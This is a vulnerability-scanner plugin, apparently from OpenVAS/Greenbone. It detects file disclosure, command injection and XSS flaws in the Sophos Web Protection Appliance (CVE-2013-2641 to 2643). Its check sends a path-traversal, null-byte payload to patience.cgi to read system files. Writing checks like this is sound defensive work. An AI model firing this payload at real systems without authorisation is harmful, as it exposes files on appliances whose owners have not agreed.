CPE = "cpe:/a:sophos:web_appliance";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103688" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-2641", "CVE-2013-2642", "CVE-2013-2643" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "Sophos Web Protection Appliance Web Interface Multiple Vulnerabilities" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-04-04 14:28:20 +0200 (Thu, 04 Apr 2013)" );
	script_xref( name: "URL", value: "http://www.sophos.com/en-us/support/knowledgebase/118969.aspx" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_sophos_web_appliance_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 443 );
	script_mandatory_keys( "sophos/web_appliance/installed" );
	script_tag( name: "solution", value: "The vendor released version 3.7.8.2 to address these issues. Please see the references and contact the vendor for information on how to obtain and apply the updates" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Sophos Web Protection Appliance Web Interface is prone to multiple vulnerabilities.

  1) Unauthenticated local file disclosure
     Unauthenticated users can read arbitrary files from the filesystem with the
     privileges of the 'spiderman' operating system user.

  2) OS command injection
     Authenticated users can execute arbitrary commands on the underlying
     operating system with the privileges of the 'spiderman' operating system user.

  3) Reflected Cross Site Scripting (XSS)" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = "/cgi-bin/patience.cgi?id=../../../../../../../" + file + "%00";
	if(buf = http_vuln_check( port: port, url: url, pattern: pattern )){
		msg = "By requesting the url " + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\nit was possible to retrieve the file /" + file + ". Response:\n\n" + buf + "\n";
		security_message( port: port, data: msg );
		exit( 0 );
	}
}
exit( 99 );

